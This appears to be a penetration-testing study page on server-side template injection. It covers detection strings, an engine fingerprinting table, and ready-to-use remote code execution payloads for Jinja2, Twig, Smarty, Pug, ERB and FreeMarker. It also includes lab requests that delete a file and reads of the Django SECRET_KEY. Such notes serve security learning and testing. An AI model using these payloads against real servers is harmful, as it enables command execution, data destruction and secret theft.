---
layout: default
title: "SSTI"
parent: "Web Application"
nav_order: 30
---

# Server-Side Template Injection (SSTI)

SSTI occurs when user input is concatenated directly into a template (rather than passed in as data), allowing attackers to inject and execute arbitrary code server-side.

- **Not vulnerable:** `$twig->render("Dear {first_name},", array("first_name" => $user.first_name))`
- **Vulnerable:** `$twig->render("Dear " . $_GET['name'])` → attack via `?name={{bad-stuff-here}}`

---

## Detection

### Fuzzing
Inject characters common to template expressions:
```
${{<%[%'"}}%\
```
If an exception is raised, input may be interpreted by a template engine.

### Two Injection Contexts

**Plaintext context:** Input is rendered as output text.
- Example template: `<h1>Welcome, {{ user_name }}!</h1>`
- Test: inject `{{ 7*7 }}` — if it returns `49`, the template engine is executing it
- Must use template syntax (`{{ }}`, `${ }`, etc.) to break out and execute code

**Code context (more dangerous):** Input lands inside an existing statement being executed.
- Example: `{% if user.role == 'admin' or user.name == 'USER_INPUT' %}`
- Don't need to break out — already inside logic
- Test with: `' or 7*7==49 or '`
- Often leads to RCE faster

---

## Template Engine Identification

| Engine | Test Payload | Expected Output |
|--------|-------------|-----------------|
| Jinja2 (Python) | `{{7*'7'}}` | `7777777` |
| Twig (PHP) | `{{7*'7'}}` | `49` |
| Smarty (PHP) | `{'Hello'\|upper}` | `HELLO` |
| Pug/Jade (Node.js) | `#{7*7}` | `49` |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| FreeMarker (Java) | `${7*7}` | `49` |
| Django (Python) | `{{7*7}}` | `49` |

**Tip:** Invalid syntax often triggers an error message that reveals the template engine and version.

Additional identification:
- Java-based: `${T(java.lang.System).getenv()}`
- Django: test `{{ settings.SECRET_KEY }}`
- FreeMarker error messages reference `freemarker`

---

## Exploitation by Template Engine

### Jinja2 (Python)
```
{{7*7}}                    # test
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```

Note: subclass index `[157]` may vary — confirm in target environment.

`check_output` usage:
```python
subprocess.check_output(['ls', '-lah'])  # separate command from args
```

### Twig (PHP)
```
{{7*'7'}}    # returns 49
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Smarty (PHP)
```
{'Hello'|upper}          # test: returns HELLO
{system("ls")}           # RCE
{system("rm /path/file")}
```

### Pug/Jade (Node.js)
```
#{7*7}    # test
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```

### ERB (Ruby)
```
<%= 7*7 %>
<%= exec("ls") %>
<%= exec("rm /home/carlos/morale.txt") %>
```
URL: `GET /?message=<%=+exec("ls")%>`

### FreeMarker (Java)
```
${7*7}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls")}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}
```

Finding the Execute class: check FreeMarker JavaDoc → `TemplateModel` interface → "All Known Implementing Classes" → `Execute`

### Handlebars (Node.js)
Use documented exploit from [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejs). Substitute `whoami` with target command.

### Django (Python)
```
{{settings.SECRET_KEY}}
```

---

## Lab Examples

### Basic SSTI (ERB)
```
GET /?message=<%=+exec("rm+/home/carlos/morale.txt")%>
```
Detection: inject `${{<%[%'"}}%\` and note `<%` doesn't appear in output.

### Code Context SSTI (Jinja2/Tornado)
Template uses `blog-post-author-display` variable. Terminate the existing statement and inject:
```
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```
Note: `{%25...%25}` = URL-encoded `{% ... %}`

### Information Disclosure (Django)
```
{{product.values}}                    # enumerate available properties
{{settings.SECRET_KEY}}               # extract secret key
```

---

## Automation

**SSTImap:**
```bash
python3 sstimap.py -X POST -u 'http://page.com:8080/directory/' -d 'page='
```

**References:**
- [HackTricks SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [SSTI Cheat Sheet (Cobalt)](https://www.cobalt.io/hubfs/0_pJf0zn5ChHY9X8sF-1-png-1.png)
